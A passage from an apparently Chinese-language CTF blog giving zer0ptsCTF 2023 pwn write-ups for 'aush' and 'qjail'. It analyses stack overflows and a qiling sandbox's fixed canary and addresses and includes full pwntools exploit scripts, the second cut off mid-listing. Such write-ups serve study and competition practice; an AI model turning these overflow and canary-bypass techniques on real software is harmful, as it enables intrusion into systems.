<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Device(id=<span class="string">&quot;socket@192.168.11.130:6666&quot;</span>, name=<span class="string">&quot;192.168.11.130:6666&quot;</span>, type=<span class="string">&#x27;remote&#x27;</span>)</span><br><span class="line">Session(pid=<span class="number">4341</span>)</span><br><span class="line"><span class="number">563e56</span>b3124c  <span class="number">4</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">20</span> <span class="number">6f</span> <span class="number">66</span> <span class="number">20</span> <span class="number">70</span> <span class="number">65</span> <span class="number">72</span> <span class="number">73</span> <span class="number">6f</span> <span class="number">6</span>e <span class="number">3</span>a <span class="number">20</span>  Name of person: </span><br><span class="line"><span class="number">7f</span>c731d82f0c  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span> <span class="number">35</span> <span class="number">38</span> <span class="number">39</span> <span class="number">34</span> <span class="number">30</span> <span class="number">34</span> <span class="number">32</span> <span class="number">31</span> <span class="number">31</span> <span class="number">33</span> <span class="number">35</span> <span class="number">36</span>  ID: <span class="number">589404211356</span></span><br><span class="line"><span class="number">7f</span>c731d82f1c  <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">33</span> <span class="number">37</span> <span class="number">38</span>                             <span class="number">3141378</span></span><br><span class="line"><span class="number">7f</span>fdd928bf37  <span class="number">0</span>a                                               .</span><br><span class="line"><span class="number">563e56</span>b31234  <span class="number">3</span>e <span class="number">20</span>                                            &gt; </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/14/zer0ptsCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/14/zer0ptsCTF2023/" class="post-title-link" itemprop="url">zer0ptsCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-14 02:18:30 / Modified: 02:22:12" itemprop="dateCreated datePublished" datetime="2023-10-14T02:18:30+08:00">2023-10-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="aush"><a href="#aush" class="headerlink" title="aush"></a>aush</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aush: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">2</span>a5305931cbcc0922d0271cf6457ea091ad67e75, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序提供了后门，但需要匹配两个随机数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>, &amp;path, (<span class="keyword">char</span> *<span class="keyword">const</span> *)envp);</span><br></pre></td></tr></table></figure>
<p>程序有栈溢出，可以覆盖 <code>passwdg</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> nameg[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-80h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> name_input[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v10; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line"><span class="keyword">char</span> passwdg[<span class="number">32</span>]; <span class="comment">// [rsp+70h] [rbp-50h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> passwd_input[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-30h] BYREF</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先进行 patch，使 <code>/usr/games/cowsay</code> 不影响程序的执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">v8 = read(fd, a1, a2) != a2;</span><br><span class="line">v9 = read(fd, a3, a4) != a4 || v8;</span><br></pre></td></tr></table></figure>
<p>程序的随机数是由 <code>/dev/urandom</code> 提供的，它将返回用算法计算出来的伪随机数 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(nameg, name_input, <span class="number">0x10</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  path = <span class="string">&quot;/usr/games/cowsay&quot;</span>;</span><br><span class="line">  v6 = <span class="string">&quot;Invalid username&quot;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  execve(<span class="string">&quot;/usr/games/cowsay&quot;</span>, &amp;path, (<span class="keyword">char</span> *<span class="keyword">const</span> *)envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>execve 会替换当前程序，而破坏环境变量会导致 execve 失效</li>
</ul>
<p>第一次溢出覆盖环境变量为 0xffff 使 execve 失效，第二次溢出覆盖环境变量为 0 使 execve 恢复</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./aush1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.2023.zer0pts.com&#x27;</span>,<span class="string">&#x27;9006&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1410)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Username:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x198</span>+p64(<span class="number">0xffff</span>))</span><br><span class="line">sla(<span class="string">&quot;Password:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x158</span>+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="qjail"><a href="#qjail" class="headerlink" title="qjail"></a>qjail</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vuln: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3b</span>d551d0922ad50f6c212770371eaad715a83d67, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>程序启动方式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sandbox.py ./vuln</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>无限栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter something&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, buf);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在提供的 Dockerfile 文件中发现该程序是通过 <code>sandbox.py</code> 启动的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> qiling</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;ELF&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cmd = [<span class="string">&#x27;./lib/ld-2.31.so&#x27;</span>, <span class="string">&#x27;--library-path&#x27;</span>, <span class="string">&#x27;/lib&#x27;</span>, sys.argv[<span class="number">1</span>]]</span><br><span class="line">    ql = qiling.Qiling(cmd, console=<span class="literal">False</span>, rootfs=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>
<ul>
<li>看上去好像只是为了换 libc 版本</li>
</ul>
<p>开了 canary，不能直接打 ROP，然而程序又没有可以泄露 canary 的地方</p>
<p>现在唯一的突破口就是 <code>qiling</code>，按照网上的说法，由 <code>qiling</code> 模块启动的程序的 canary 为固定值，并且还可以进行任意设置：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ql = qiling.Qiling(cmd, console=<span class="literal">False</span>, rootfs=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">ql.env[<span class="string">&quot;__cookie&quot;</span>] = <span class="string">&quot;0x12345678&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>ql.env</code> 字典来设置环境变量</li>
</ul>
<p>Canary 的数值来源于 <code>AT_RANDOM</code>，它包含了从 <code>/dev/urandom</code> 设备文件中读取的随机数，在没有设置 <code>__cookie</code> 的情况下，由 <code>qiling</code> 启动的程序会将 <code>AT_RANDOM</code> 设置为一个固定值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxv_entries = (</span><br><span class="line">    ......</span><br><span class="line">    (AUXV.AT_RANDOM, randstraddr),</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_stack = randstraddr = __push_str(new_stack, <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__push_str</span>(<span class="params">top: <span class="built_in">int</span>, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">    data = s.encode(<span class="string">&#x27;latin&#x27;</span>) + <span class="string">b&#x27;\x00&#x27;</span> <span class="comment"># 字节对象的编码转换</span></span><br><span class="line">    top = self.ql.mem.align(top - <span class="built_in">len</span>(data), self.ql.arch.pointersize)</span><br><span class="line">    self.ql.mem.write(top, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> top</span><br></pre></td></tr></table></figure>
<ul>
<li>canary 的默认值就是 0x6161616161616100</li>
</ul>
<p>查看 <code>qiling</code> 源码中的 <code>qiling/profile/linux.ql</code> 文件可以发现：ld 基地址，栈基地址，mmap 映射地址都是固定的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[OS64]</span><br><span class="line">stack_address = <span class="number">0x7ffffffde000</span></span><br><span class="line">stack_size = <span class="number">0x30000</span></span><br><span class="line">load_address = <span class="number">0x555555554000</span></span><br><span class="line">interp_address = <span class="number">0x7ffff7dd5000</span></span><br><span class="line">mmap_address = <span class="number">0x7fffb7dd6000</span></span><br><span class="line">vsyscall_address = <span class="number">0xffffffffff600000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其中并没有程序基地址和 libc 基地址的信息</li>
</ul>
<p>通过设置 <code>ql.debugger = True</code> 得到的调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">           <span class="number">0x30000</span>            <span class="number">0x31000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      [GDT]</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/yhellow/桌面/pwn/lib/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x555555555000</span>     <span class="number">0x555555578000</span> r-xp    <span class="number">23000</span> <span class="number">0</span>      /home/yhellow/桌面/pwn/lib/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x555555578000</span>     <span class="number">0x555555580000</span> r--p     <span class="number">8000</span> <span class="number">0</span>      /home/yhellow/桌面/pwn/lib/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x555555581000</span>     <span class="number">0x555555582000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/yhellow/桌面/pwn/lib/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x555555582000</span>     <span class="number">0x555555584000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      /home/yhellow/桌面/pwn/lib/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x555555584000</span>     <span class="number">0x555555586000</span> rwxp     <span class="number">2000</span> <span class="number">0</span>      [hook_mem]</span><br><span class="line">    <span class="number">0x7fffb7dd6000</span>     <span class="number">0x7fffb7dd7000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      [mmap] vuln</span><br><span class="line">    <span class="number">0x7fffb7dd7000</span>     <span class="number">0x7fffb7dd8000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [mmap] vuln</span><br><span class="line">    <span class="number">0x7fffb7dd8000</span>     <span class="number">0x7fffb7dd9000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      [mmap] vuln</span><br><span class="line">    <span class="number">0x7fffb7dd9000</span>     <span class="number">0x7fffb7dda000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      [mmap] vuln</span><br><span class="line">    <span class="number">0x7fffb7dda000</span>     <span class="number">0x7fffb7ddb000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [mmap] vuln</span><br><span class="line">    <span class="number">0x7fffb7ddb000</span>     <span class="number">0x7fffb7dfd000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      [mmap] libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7fffb7dfd000</span>     <span class="number">0x7fffb7f75000</span> r-xp   <span class="number">178000</span> <span class="number">0</span>      [mmap] libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7fffb7f75000</span>     <span class="number">0x7fffb7fc3000</span> r--p    <span class="number">4e000</span> <span class="number">0</span>      [mmap] libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7fffb7fc3000</span>     <span class="number">0x7fffb7fc7000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [mmap] libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7fffb7fc7000</span>     <span class="number">0x7fffb7fc9000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      [mmap] libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7fffb7fc9000</span>     <span class="number">0x7fffb7fcd000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      [mmap anonymous]</span><br><span class="line">    <span class="number">0x7fffb7fcd000</span>     <span class="number">0x7fffb7fcf000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      [mmap anonymous]</span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x80000000e000</span> rwxp    <span class="number">30000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 load_address 就是 ld 的加载地址，而 mmap_address 就是程序基地址，libc 基地址就在其后</li>
<li>经过测试发现这些地址都是固定的</li>
</ul>
<p>最后尝试用 sys_execve 的时候出现了问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;/home/yhellow/桌面/pwn/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
<p>由于程序限制了根目录，直接打 ORW</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span 